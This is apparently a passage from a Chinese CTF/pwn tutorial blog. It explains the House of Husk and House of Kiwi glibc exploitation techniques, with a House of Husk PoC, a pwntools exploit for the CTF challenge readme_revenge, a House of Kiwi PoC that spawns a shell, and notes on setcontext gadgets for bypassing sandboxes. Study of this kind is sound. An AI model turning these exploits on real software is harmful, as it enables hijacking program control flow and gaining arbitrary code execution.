<p>我们可以利用这样一条调用链<code>printf-&gt;vfprintf-&gt;printf_positional-&gt;__parse_one_specmb</code>，通过篡改<code>__printf_arginfo_table</code>和<code>__printf_function_table</code>来进行攻击，可以看到当<code>__printf_function_table</code>非空，将会调用<code>printf_positional</code>函数</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">	va_list arg;</span><br><span class="line">    <span class="type">int</span> done;</span><br><span class="line">    <span class="built_in">va_start</span> (arg, format);</span><br><span class="line">    done = <span class="built_in">vfprintf</span> (stdout, format, arg);</span><br><span class="line">    <span class="built_in">va_end</span> (arg);</span><br><span class="line">    <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">  	<span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    		<span class="keyword">goto</span> do_positional;</span><br><span class="line">	...</span><br><span class="line">do_positional:</span><br><span class="line">	...</span><br><span class="line">  	done = <span class="built_in">printf_positional</span> (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">printf_positional</span> <span class="params">(_IO_FILE *s, <span class="type">const</span> CHAR_T *format, <span class="type">int</span> readonly_format,</span></span></span><br><span class="line"><span class="params"><span class="function">		   va_list ap, va_list *ap_savep, <span class="type">int</span> done, <span class="type">int</span> nspecs_done,</span></span></span><br><span class="line"><span class="params"><span class="function">		   <span class="type">const</span> UCHAR_T *lead_str_end,</span></span></span><br><span class="line"><span class="params"><span class="function">		   CHAR_T *work_buffer, <span class="type">int</span> save_errno,</span></span></span><br><span class="line"><span class="params"><span class="function">		   <span class="type">const</span> <span class="type">char</span> *grouping, THOUSANDS_SEP_T thousands_sep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">extern</span> printf_function **__printf_function_table;</span><br><span class="line">	<span class="type">int</span> function_done;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">	    &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">	    &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">	 &#123;</span><br><span class="line">	      <span class="type">const</span> <span class="type">void</span> **ptr = <span class="built_in">alloca</span> (specs[nspecs_done].ndata_args</span><br><span class="line">					 * <span class="built_in">sizeof</span> (<span class="type">const</span> <span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class="line">	      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; specs[nspecs_done].ndata_args; ++i)</span><br><span class="line">			ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Call the function.  */</span></span><br><span class="line">	      function_done = __printf_function_table[(<span class="type">size_t</span>) spec](s, &amp;specs[nspecs_done].info, ptr);</span><br><span class="line">      	  ...</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__parse_one_specmb (<span class="type">const</span> UCHAR_T *format, <span class="type">size_t</span> posn,</span><br><span class="line">		    <span class="keyword">struct</span> printf_spec *spec, <span class="type">size_t</span> *max_ref_arg)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">      || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">      || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">      <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">	 uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">	 the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">      || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">				   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">				    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>泄露 <code>libc</code> 地址。</p>
</li>
<li><p>修改 <code>global_max_fast</code> 为很大的值，可以 <code>large bin attack/unsorted bin attack</code></p>
</li>
<li><p>将 <code>__printf_function_table</code> 或者 <code>__printf_arginfo_table</code> 覆盖为指向写有 <code>one_gadget</code> 的内存的指针。其中 <code>one_gadget</code> 在内存中的偏移对应与之后触发漏洞的 <code>spec</code> 。</p>
</li>
<li><p>如果是利用 <code>__printf_function_table</code> 触发漏洞需要让 <code>__printf_arginfo_table</code> 指向一块内存并且该内存对应 <code>spec</code> 偏移处设为 null ，否则会在 <code>__parse_one_specmb</code> 函数的 if 判断中造成不可预知的错误。</p>
</li>
<li><p>最后调用 <code>printf</code> 触发漏洞获取 <code>shell</code> 。</p>
</li>
</ul>
<p><strong>图解</strong></p>
<p>对于 <code>glibc-2.27</code> 而言：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/husk.png"
                      alt="husk"
                ></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a><a class="link"   href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/013910" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">    <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak libc */</span></span><br><span class="line">    a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="built_in">offset2size</span>(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">    a[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="built_in">offset2size</span>(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">    a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">    <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// unsorted bin 泄露 libc</span></span><br><span class="line">    libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">    <span class="comment">/* &#x27;X&#x27;-2 mean that prev_size | size */</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">    <span class="comment">// now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line">    <span class="comment">/*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET; */</span></span><br><span class="line">    <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">    a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">    <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">    <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">// =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ignite! */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024120231850.png"
                      alt="image-20231024120231850"
                ></p>
<h2 id="34C3CTF2017-readme-revenge"><a href="#34C3CTF2017-readme-revenge" class="headerlink" title="[34C3CTF2017]readme_revenge"></a><a class="link"   href="https://github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.13_pwn_34c3ctf2017_readme_revenge" >[34C3CTF2017]readme_revenge <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查信息-1"><a href="#检查信息-1" class="headerlink" title="检查信息"></a>检查信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024113648875.png"
                      alt="image-20231024113648875"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024113706190.png"
                      alt="image-20231024113706190"
                ></p>
<p>静态编译并且没有去除符号。</p>
<h3 id="试运行-2"><a href="#试运行-2" class="headerlink" title="试运行"></a>试运行</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024113820842.png"
                      alt="image-20231024113820842"
                ></p>
<h3 id="逆向分析-3"><a href="#逆向分析-3" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400A0D                               ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000400A0D                               public main</span><br><span class="line">.text:0000000000400A0D                               main proc near                          ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:0000000000400A0D</span><br><span class="line">.text:0000000000400A0D                               var_1020= qword ptr -1020h</span><br><span class="line">.text:0000000000400A0D</span><br><span class="line">.text:0000000000400A0D                               ; __unwind &#123;</span><br><span class="line">.text:0000000000400A0D 55                            push    rbp</span><br><span class="line">.text:0000000000400A0E 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000400A11 48 8D A4 24 E0 EF FF FF       lea     rsp, [rsp-1020h]</span><br><span class="line">.text:0000000000400A19 48 83 0C 24 00                or      [rsp+1020h+var_1020], 0</span><br><span class="line">.text:0000000000400A1E 48 8D A4 24 20 10 00 00       lea     rsp, [rsp+1020h]</span><br><span class="line">.text:0000000000400A26 48 8D 35 B3 69 2B 00          lea     rsi, name</span><br><span class="line">.text:0000000000400A2D 48 8D 3D 50 C7 08 00          lea     rdi, unk_48D184	;%s</span><br><span class="line">.text:0000000000400A34 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400A39 E8 22 71 00 00                call    __isoc99_scanf</span><br><span class="line">.text:0000000000400A39</span><br><span class="line">.text:0000000000400A3E 48 8D 35 9B 69 2B 00          lea     rsi, name</span><br><span class="line">.text:0000000000400A45 48 8D 3D 3B C7 08 00          lea     rdi, aHiSBye                    ; &quot;Hi, %s. Bye.\n&quot;</span><br><span class="line">.text:0000000000400A4C B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400A51 E8 7A 6F 00 00                call    printf</span><br><span class="line">.text:0000000000400A51</span><br><span class="line">.text:0000000000400A56 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400A5B 5D                            pop     rbp</span><br><span class="line">.text:0000000000400A5C C3                            retn</span><br><span class="line">.text:0000000000400A5C                               ; &#125; // starts at 400A0D</span><br><span class="line">.text:0000000000400A5C</span><br><span class="line">.text:0000000000400A5C                               main endp</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024114633005.png"
                      alt="image-20231024114633005"
                ></p>
<p>存在缓冲区漏洞，向 <code>.bss</code> 节的 <code>name</code> 变量写入内容，然后打印它。并且 <code>flag</code> 位于 <code>.data</code> 节，可以利用 <code>__stack_chk_fail()</code> 将其打印出来。</p>
<h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用缓冲区溢出篡改 <code>__printf_function_table</code> 指向一个非零值，因为 <code>%s</code> 的 <code>ascii</code> 是 <code>0x73</code>，所以让 <code>__printf_arginfo_table</code> 指向 <code>fake_arginfo_table[0x73*8] == __stack_chk_fail()</code>，将 <code>argv[0]</code> 改为 <code>flag</code> 地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024115056364.png"
                      alt="image-20231024115056364"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024115137320.png"
                      alt="image-20231024115137320"
                ></p>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./readme_revenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x6b4040</span></span><br><span class="line">name_addr = <span class="number">0x6b73e0</span></span><br><span class="line">argv_addr = <span class="number">0x6b7980</span></span><br><span class="line">func_table = <span class="number">0x6b7a28</span></span><br><span class="line">arginfo_table = <span class="number">0x6b7aa8</span></span><br><span class="line"></span><br><span class="line">stack_chk_fail = <span class="number">0x4359b0</span></span><br><span class="line"></span><br><span class="line">payload  = p64(flag_addr)       <span class="comment"># name</span></span><br><span class="line">payload  = payload.ljust(<span class="number">0x73</span> * <span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack_chk_fail)  <span class="comment"># __printf_arginfo_table[spec-&gt;info.spec]</span></span><br><span class="line">payload  = payload.ljust(argv_addr - name_addr, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(name_addr)       <span class="comment"># argv</span></span><br><span class="line">payload  = payload.ljust(func_table - name_addr, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(name_addr)       <span class="comment"># __printf_function_table</span></span><br><span class="line">payload  = payload.ljust(arginfo_table - name_addr, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(name_addr)       <span class="comment"># __printf_arginfo_table</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">&#x27;b *0x400A4C&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024115210102.png"
                      alt="image-20231024115210102"
                ></p>
<h1 id="House-of-Kiwi"><a href="#House-of-Kiwi" class="headerlink" title="House of Kiwi"></a>House of Kiwi</h1><p><code>glibc &lt; 2.36</code>，这里有一点需要注意，高版本的 <code>glibc</code> 的 <code>_IO_file_jumps</code> 有的是不可写的，所以可以通过 <code>vmmap</code> 来查看此段是否具有可写权限。可以通过 <code>mprotect((void*)(libc_base + 0x215000), 0x2000, PROT_READ | PROT_WRITE);</code> 改写其权限。</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>有如下调用链:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> NDEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> assert(expr) ((void) 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> assert(expr) \</span></span><br><span class="line"><span class="meta">  ((expr)								      \</span></span><br><span class="line"><span class="meta">   ? ((void) 0)								      \</span></span><br><span class="line"><span class="meta">   : __malloc_assert (#expr, __FILE__, __LINE__, __func__))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p><em>tips:通过<code>large bin chunk</code>的<code>size</code>中<code>flag</code>位修改,或者<code>top chunk</code>的<code>inuse</code>写<code>0</code>等方法可以触发<code>assert</code></em></p>
<p>当我们触发 <code>assert</code> 断言时会调用 <code>__malloc_assert</code>，<code>__malloc_assert</code> 里有这样一条调用链：<code>fflush-&gt;_IO_fflush</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fflush (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> result;</span><br><span class="line">      <span class="built_in">CHECK_FILE</span> (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行到 <code>result = _IO_SYNC (fp) ? EOF : 0;</code> 时，会调用 <code>_IO_new_file_sync</code>， <code>_IO_file_jumps_</code> 可写。因此将 <code>_IO_file_jumps_</code> 对应 <code>_IO_new_file_sync</code> 函数指针的位置覆盖为 <code>one_gadget</code> 就可以获取 <code>shell</code> 。</p>
<p>利用前提：</p>
<ol>
<li>能够触发 <code>__malloc_assert</code>。</li>
<li>能够申请到 <code>_IO_file_sync</code> 和 <code>_IO_helper_jumps</code> 这两个位置并且修改。</li>
</ol>
<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>未开沙箱 poc</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x7a4e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_file_sync = libc_base + <span class="number">0x1f45e0</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_file_sync) = &amp;getshell;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231025114705128.png"
                      alt="image-20231025114705128"
                ></p>
<p><strong>开了沙箱禁用 execve</strong></p>
<p>对于禁用 <code>execve</code> 的程序需要借助 <code>(setcontext+61) + rop</code> 或 <code>shellcode</code> 进行 <code>orw</code> 。<code>glibc 2.29</code>之后 <code>setcontext</code>中的 <code>gadget</code>变成了以 <code>rdx </code>索引，因此还要先通过 <code>ROP</code>控制 <code>RDX</code>的值。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; setcontext+61</span><br><span class="line">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:00000000000580E4                 mov     rbx, [rdx+80h]</span><br><span class="line">.text:00000000000580EB                 mov     rbp, [rdx+78h]</span><br><span class="line">.text:00000000000580EF                 mov     r12, [rdx+48h]</span><br><span class="line">.text:00000000000580F3                 mov     r13, [rdx+50h]</span><br><span class="line">.text:00000000000580F7                 mov     r14, [rdx+58h]</span><br><span class="line">.text:00000000000580FB                 mov     r15, [rdx+60h]</span><br><span class="line">.text:00000000000580FF                 test    dword ptr fs:48h, 2</span><br><span class="line">    ....</span><br><span class="line">.text:00000000000581C6                 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:00000000000581CD                 push    rcx</span><br><span class="line">.text:00000000000581CE                 mov     rsi, [rdx+70h]</span><br><span class="line">.text:00000000000581D2                 mov     rdi, [rdx+68h]</span><br><span class="line">.text:00000000000581D6                 mov     rcx, [rdx+98h]</span><br><span class="line">.text:00000000000581DD                 mov     r8, [rdx+28h]</span><br><span class="line">.text:00000000000581E1                 mov     r9, [rdx+30h]</span><br><span class="line">.text:00000000000581E5                 mov     rdx, [rdx+88h]</span><br><span class="line">.text:00000000000581EC                 xor     eax, eax</span><br><span class="line">.text:00000000000581EE                 retn</span><br></pre></td></tr></table></figure></div>

<p><em>tips:注意，内存中有不止一个  <code>_IO_helper_jumps_</code> ，具体是哪一个要通过调试确定</em></p>
